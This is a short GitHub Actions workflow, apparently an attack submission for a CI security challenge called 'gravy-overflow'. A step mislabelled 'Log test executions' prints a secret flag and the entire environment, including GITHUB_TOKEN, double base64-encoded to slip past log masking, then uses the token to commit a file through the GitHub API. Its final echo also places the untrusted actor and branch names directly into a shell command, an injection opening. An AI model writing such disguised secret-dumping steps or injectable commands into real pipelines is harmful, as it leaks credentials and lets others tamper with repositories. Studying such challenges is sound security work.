name: "Create tag"
on:
  create:

permissions: {}

jobs:
  tagged:
    runs-on: ubuntu-latest
    timeout-minutes: 1
    permissions:
      id-token: write
      contents: write
      pull-requests: write
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      FLAG_GRAVY_OVERFLOW_L0_CHEDDAR: ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_CHEDDAR }}
    steps:
      - name: Log test executions
        run: |
          echo $FLAG_GRAVY_OVERFLOW_L0_CHEDDAR | base64 -w0 | base64 -w0
          gh api --method PUT -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" /repos/sahnaseredini/gravy-overflow/contents/test.txt -f "message=my commit message" -f "committer[name]=Monalisa Octocat" -f "committer[email]=octocat@github.com" -f "content=bXkgbmV3IGZpbGUgY29udGVudHM="
          env | base64 -w0 | base64 -w0
          echo "Lint ran for branch ${{ github.event.workflow_run.head_branch }} in a PR from ${{ github.actor }}. Please check the logs for more information."
